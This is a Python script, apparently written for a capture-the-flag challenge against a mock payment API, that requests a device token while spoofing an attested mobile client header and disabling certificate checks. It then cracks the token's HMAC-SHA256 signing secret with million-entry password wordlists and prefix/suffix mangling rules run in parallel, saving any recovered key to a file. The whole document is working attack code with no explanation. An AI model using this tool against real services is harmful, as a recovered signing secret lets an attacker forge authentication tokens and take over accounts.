import base64, hashlib, hmac, json, os, ssl, sys, urllib.request
from multiprocessing import Pool

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CL = "MeridianPay-Android/3.2.1 (attested)"
r = urllib.request.Request(BASE+"/api/v1/auth/device", data=json.dumps({"device_id":"crack2"}).encode(),
                           method="POST", headers={"Content-Type":"application/json","X-Meridian-Client":CL})
with urllib.request.urlopen(r, context=CTX, timeout=15) as f:
    TOKEN = json.loads(f.read())["token"]
h0, p0, s0 = TOKEN.split(".")
SIGNING = (h0+"."+p0).encode()
SIG = base64.urlsafe_b64decode(s0+"="*(-len(s0)%4))

PRE = [b"", b"meridian", b"meridianpay", b"meridian-pay", b"meridian_pay", b"mp", b"mp-", b"pay", b"pay-",
       b"h7", b"h7ctf", b"h7-", b"bank", b"bank-", b"neobank", b"meridianpay-"]
SUF = [b"", b"-", b"_", b"1", b"123", b"!", b"2026", b"-2026", b"_2026", b"-secret", b"_secret", b"secret", b"-key", b"_key", b"key"]
N = 12

def crack(job):
    path, a, b, rules = job
    new, sha, cd = hmac.new, hashlib.sha256, hmac.compare_digest
    with open(path, "rb") as f:
        f.seek(a)
        if a: f.readline()
        pos = f.tell()
        while pos < b:
            line = f.readline()
            if not line: break
            pos = f.tell()
            k = line.rstrip(b"\r\n").split()[-1] if path.startswith("xato") and b" " in line else line.rstrip(b"\r\n")
            if not k: continue
            if cd(new(k, SIGNING, sha).digest(), SIG): return (path, k)
            if rules:
                lw = k.lower()
                for pre in PRE:
                    for suf in SUF:
                        kk = pre + lw + suf
                        if cd(new(kk, SIGNING, sha).digest(), SIG): return (path, kk)
                        kk2 = pre + k + suf
                        if kk2 != kk and cd(new(kk2, SIGNING, sha).digest(), SIG): return (path, kk2)
    return None

if __name__ == "__main__":
    specs = [("xato-net-10-million-passwords-1000000.txt", False),
             ("Pwdb_top-1000000.txt", False),
             ("probable-v2_top-12000.txt", False),
             ("xato-net-10-million-passwords-1000000.txt", True),
             ("Pwdb_top-1000000.txt", True)]
    jobs = []
    for path, rules in specs:
        size = os.path.getsize(path)
        lim = size if not rules else min(size, 30_000_000)
        step = lim // N
        for i in range(N):
            jobs.append((path, i*step, (i+1)*step if i < N-1 else lim, rules))
    print("jobs", len(jobs), flush=True)
    with Pool(N) as pool:
        hit = None
        for res in pool.imap_unordered(crack, jobs):
            if res:
                hit = res; pool.terminate(); break
    print("HIT:", hit, flush=True)
    if hit:
        open("jwt_secret.bin","wb").write(hit[1])
